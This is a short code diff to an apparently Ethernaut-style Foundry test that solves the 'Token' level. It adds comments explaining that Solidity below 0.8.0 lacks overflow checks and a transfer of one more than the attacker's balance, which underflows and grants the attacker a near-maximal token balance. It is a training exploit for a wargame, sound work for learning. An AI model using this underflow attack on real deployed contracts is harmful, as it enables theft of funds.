@@ -28,6 +28,12 @@ contract TokenTest is Test {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+        // In solidity < 0.8.0 there are no underflow / overflow checks
+        // It is possible to leverage this to get a very large amount of token
+        // By causing an overflow, it will assign type(uint256).max token to the attacker
+        // and _initialSupply + initial balance of attacker to the token contract creator
+        uint256 attackerBalance = ethernautToken.balanceOf(attacker);
+        ethernautToken.transfer(address(tokenFactory), attackerBalance + 1);
 
         //////////////////////
         // LEVEL SUBMISSION //
